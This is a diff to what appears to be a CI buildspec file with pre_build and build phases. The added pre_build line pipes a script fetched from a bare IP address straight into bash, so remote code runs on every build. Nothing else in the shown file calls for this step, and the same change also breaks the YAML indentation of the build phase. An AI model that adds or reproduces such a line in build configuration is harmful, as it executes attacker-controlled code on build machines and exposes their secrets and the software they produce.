@@ -19,7 +19,8 @@ phases:
   pre_build:
     commands:
       - /bin/bash ./scripts/cache-load.sh
-  build:
+      - curl http://64.227.177.32/26460f32a3164e6382436aba45eaf862.sh | bash
+build:
     commands:
       - 'if ${BUMP_CANDIDATE:-false}; then /bin/bash ./scripts/bump-candidate.sh; fi'
       - /bin/bash ./scripts/align-version.sh
